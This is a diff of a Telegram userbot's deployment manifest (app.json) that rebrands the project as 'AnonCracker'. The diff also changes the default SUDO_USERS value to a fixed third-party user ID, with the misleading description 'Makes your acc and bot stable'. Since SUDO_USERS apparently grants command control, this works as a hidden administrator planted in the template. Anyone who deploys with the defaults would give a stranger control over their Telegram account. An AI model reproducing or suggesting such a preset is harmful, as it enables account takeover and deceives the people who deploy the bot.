@@ -1,7 +1,7 @@
 {
-  "name": "HardcoreUserbot",
-  "description": "Userbot created by a @Hack12R Ask https://t.me/Hack12R for any problems or support",
-  "logo": "https://telegra.ph/file/1b1304649ee3ecd281322.jpg",
+  "name": "AnonCracker",
+  "description": "Userbot created by a @anon_cracker Ask https://t.me/anon_cracker for any problems or support",
+  "logo": "https://telegra.ph/AnonCracker-05-27",
   "keywords": [
     "telegram",
     "userbot",
@@ -9,7 +9,7 @@
     "modular",
     "productivity"
   ],
-  "repository": "https://github.com/Hack12R/HardcoreUserbot/",
+  "repository": "https://github.com/AnonCracker1/AnonCracker/",
   "website": "#TODO",
   "success_url": "#TODO",
   "env": {
@@ -66,7 +66,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes your acc and bot stable",
-      "value": "1037944593",
+      "value": "748471982",
       "required": false
     },
     "HEROKU_APP_NAME": {
